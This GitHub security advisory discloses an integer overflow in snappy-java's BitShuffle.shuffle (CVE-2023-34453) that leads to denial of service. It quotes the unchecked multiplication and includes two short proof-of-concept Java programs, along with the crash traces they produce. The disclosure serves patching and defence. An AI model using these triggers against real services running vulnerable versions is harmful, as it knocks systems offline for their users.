# [M] snappy-java's Integer Overflow vulnerability in shuffle leads to DoS

## Summary
Severity: Medium
Advisory: GHSA-pqr6-cmr2-h8hf
CVE: CVE-2023-34453
CWE: CWE-190
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-06-15
Source: https://github.com/advisories/GHSA-pqr6-cmr2-h8hf
Type: github-advisory

## Affected
- Maven: `org.xerial.snappy:snappy-java` — affected >=0 <1.1.10.1

## Details
## Summary
Due to unchecked multiplications, an integer overflow may occur, causing a fatal error.
## Impact
Denial of Service
## Description
The function [shuffle(int[] input)](https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/BitShuffle.java#L107) in the file [BitShuffle.java](https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/BitShuffle.java) receives an array of integers and applies a bit shuffle on it. It does so by multiplying the length by 4 and passing it to the natively compiled shuffle function.

```java
public static byte[] shuffle(int[] input) throws IOException {
        byte[] output = new byte[input.length * 4];
        int numProcessed = impl.shuffle(input, 0, 4, input.length * 4, output, 0);
        assert(numProcessed == input.length * 4);
        return output;
    }

```

Since the length is not tested, the multiplication by four can cause an integer overflow and become a smaller value than the true size, or even zero or negative. In the case of a negative value, a “java.lang.NegativeArraySizeException” exception will raise, which can crash the program. In a case of a value that is zero or too small, the code that afterwards references the shuffled array will assume a bigger size of the array, which might cause exceptions such as “java.lang.ArrayIndexOutOfBoundsException”.
The same issue exists also when using the “shuffle” functions that receive a double, float, long and short, each using a different multiplier that may cause the same issue.

## Steps To Reproduce
Compile and run the following code:

```java
package org.example;
import org.xerial.snappy.BitShuffle;

import java.io.*;


public class Main {

    public static void main(String[] args) throws IOException {
        int[] original = new int[0x40000000];
        byte[] shuffled = BitShuffle.shuffle(original);
        System.out.println(shuffled[0]);
    }
}

```
The program will crash, showing the following error (or similar):

```
Exception in thread "main" java.lang.ArrayIndexOutOfBoundsException: Index 0 out of bounds for length 0
	at org.example.Main.main(Main.java:12)

Process finished with exit code 1

```

Alternatively - compile and run the following code:

```java
package org.example;
import org.xerial.snappy.BitShuffle;

import java.io.*;


public class Main {

    public static void main(String[] args) throws IOException {
        int[] original = new int[0x20000000];
        byte[] shuffled = BitShuffle.shuffle(original);
    }
}

```
The program will crash with the following error (or similar):

```
Exception in thread "main" java.lang.NegativeArraySizeException: -2147483648
	at org.xerial.snappy.BitShuffle.shuffle(BitShuffle.java:108)
	at org.example.Main.main(Main.java:11)
```

## References
- https://github.com/xerial/snappy-java/security/advisories/GHSA-pqr6-cmr2-h8hf
- https://nvd.nist.gov/vuln/detail/CVE-2023-34453
- https://github.com/xerial/snappy-java/commit/820e2e074c58748b41dbd547f4edba9e108ad905
- https://github.com/xerial/snappy-java
- https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/BitShuffle.java#L107
- https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/BitShuffle.java
